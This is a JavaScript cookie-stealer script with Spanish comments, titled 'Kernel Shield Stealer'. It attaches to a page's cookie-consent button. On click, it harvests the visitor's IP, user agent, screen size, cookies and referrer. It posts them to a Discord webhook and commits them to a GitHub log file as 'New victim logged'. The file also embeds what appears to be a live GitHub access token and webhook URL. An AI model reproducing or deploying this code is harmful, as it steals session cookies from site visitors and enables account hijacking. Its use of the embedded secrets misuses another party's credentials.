// CONFIGURACIÓN
const GITHUB_TOKEN = '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'; // Pon aquí tu token de GitHub
const REPO_OWNER = 'k3rnel-pan1c'; // Tu usuario de GitHub
const REPO_NAME = 'kernel-shield'; // Nombre de tu repositorio
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1556612161101373560/1L8YmVpZcSKSDVxPAWIzQYdM7rPjpo114xqghJbgsPaXhGt5wsEtDDXBa_Y7o9LJuMfZ'; 


async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch (e) {
        return 'Unknown';
    }
}

async function sendToDiscord(data) {
    const payload = {
        embeds: [{
            title: "🍪 Nueva Cookie Robada",
            color: 0x673DE6, // Tu color de marca
            fields: [
                { name: "🌐 IP", value: data.ip || "N/A" },
                { name: "💻 Navegador/SO", value: data.userAgent || "N/A" },
                { name: "📺 Resolución", value: data.screenRes || "N/A" },
                { name: "🔑 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "N/A" },
                { name: "🕒 Hora", value: new Date().toLocaleString() }
            ],
            footer: { text: "Kernel Shield Stealer" },
            timestamp: new Date().toISOString()
        }]
    };

    await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

async function updateGitHubLog(data) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/log.json`;
    let existingData = [];
    
    try {
        const res = await fetch(url + '?ref=main');
        if (res.ok) {
            const json = await res.json();
            existingData = JSON.parse(atob(json.content));
        }
    } catch(e) {}

    existingData.push(data);

    await fetch(url + '?sha=main', {
        method: 'PUT',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: 'New victim logged',
            content: btoa(JSON.stringify(existingData))
        })
    });
}

async function stealAndNotify() {
    const ip = await getIP();
    const userData = {
        ip: ip,
        userAgent: navigator.userAgent,
        screenRes: window.screen.width + 'x' + window.screen.height,
        cookies: document.cookie.substring(0, 500),
        timestamp: new Date().toISOString(),
        referrer: document.referrer
    };

    // Enviamos a Discord y guardamos en GitHub simultáneamente
    Promise.all([
        sendToDiscord(userData),
        updateGitHubLog(userData)
    ]);
}

document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('cookieAccept');
    if(btn) {
        btn.addEventListener('click', () => {
            console.log("Cookies accepted. Data stolen.");
            stealAndNotify();
        });
    }
});
